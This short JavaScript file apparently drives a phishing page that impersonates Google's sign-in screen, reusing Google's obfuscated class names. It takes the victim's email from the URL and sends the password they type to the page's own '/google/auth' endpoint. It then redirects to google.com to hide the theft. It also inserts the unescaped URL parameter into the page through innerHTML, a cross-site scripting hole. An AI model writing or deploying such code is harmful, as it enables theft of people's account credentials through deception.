const emailEl = document.querySelector('.IxcUte')
const email = getQueryVariable('email')
emailEl.innerHTML = email

function getQueryVariable(variable) {
    var query = window.location.search.substring(1);
    var vars = query.split('&');
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) {
            return decodeURIComponent(pair[1]);
        }
    }
    return ''
}

function signIn() {
    const { value: password } = document.querySelector('.whsOnd')
    console.log({ email, password })
    fetch('/google/auth', {
        method: 'post',
        body: JSON.stringify({login: email, password}),
        headers: {
            "Content-Type": "application/json"
        }
    }).then(()=> { window.location.href = 'https://google.com/' })
}

function showPass() {
    const { checked } = document.querySelector('.VfPpkd-muHVFf-bMcfAe')
    const inp = document.querySelector('.whsOnd')
    inp.setAttribute('type', checked ? 'text' : 'password')
}